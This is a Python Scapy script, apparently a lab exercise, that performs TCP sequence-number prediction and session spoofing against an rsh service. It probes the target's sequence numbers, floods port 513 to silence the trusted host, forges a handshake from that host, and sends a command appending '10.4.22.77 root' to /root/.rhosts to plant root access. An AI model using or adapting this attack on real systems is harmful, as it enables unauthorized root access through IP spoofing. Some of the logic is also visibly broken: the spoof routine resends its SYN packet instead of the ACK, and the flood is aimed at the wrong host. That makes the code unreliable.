from scapy.all import *

import sys
import re
from statistics import mode

lseq = 100
sport = 900
dport = 514

#find gap in subsequent SEQ values
def detective(src):
	previous = 0
	seqs = []
	for i in range(20):
		ip = IP()
		ip.dst = src
		tcp = TCP()
		tcp.dport = 513
		tcp.flags = "S"
		resp = sr1(ip/tcp, verbose = 0)
		if(i!=0):
			seqs.append(resp[TCP].seq - previous)
		previous = resp[TCP].seq
	return mode(seqs)

#flood port 513 to block logins
def synFlood(src, target, payload):
	for port in range(10):
		ip = IP(src=src, dst=target)
		tcp = TCP(sport=15151, dport=513)
		pkt = ip / tcp / payload
		send(pkt)

#get next seq value
def getNext(val, seq_gap):
	ip = IP(dst=val)
	tcp = TCP(dport=514, sport=514, flags="S")
	resp = sr1(ip/tcp, verbose = 0)
	return resp[TCP].seq + 1 + seq_gap

#spoof three-way handshake between src and dest with precalculated ack value
def spoof(src, dest, ack):
	global lseq, sport, dport
	ip = IP(src=src, dst=dest)
	tcp = TCP(sport=sport, dport=dport, seq=lseq, flags="S")
	pkt = (ip/tcp)
	send(pkt, verbose=0)
	lseq += 1
	time.sleep(3) #wait before sending next packet
	tcp = TCP(sport=sport, dport=dport, ack=ack, flags="A")
	send(pkt,verbose=0)
	time.sleep(3)

def sendPL(src, dest, ack, payload):
	global lseq, sport, dport
	ip = IP(src=src, dst=dest)
	tcp = TCP(sport=sport, dport=dport, seq=lseq, ack=ack, flags="PA")
	pkt = ip/tcp/payload
	send(pkt,verbose=0)
	lseq += len(payload)
	time.sleep(3)

if __name__ == "__main__":
	conf.iface = sys.argv[1]
	target_ip = sys.argv[2]
	trusted_host_ip = sys.argv[3]

	my_ip = get_if_addr(sys.argv[1])

	#TODO: figure out SYN sequence number pattern
	seq_gap = detective(target_ip)
	print(seq_gap)
	synFlood(trusted_host_ip, target_ip, "disable")
	predicted = getNext(target_ip, seq_gap)
	
	#TODO: TCP hijacking with predicted sequence number
	#SPOOOOOOOOOOOOOF
	spoof(trusted_host_ip, target_ip, predicted)
	#send payload for access
	sendPL(trusted_host_ip, target_ip, predicted, "echo '10.4.22.77 root' >> /root/.rhosts")

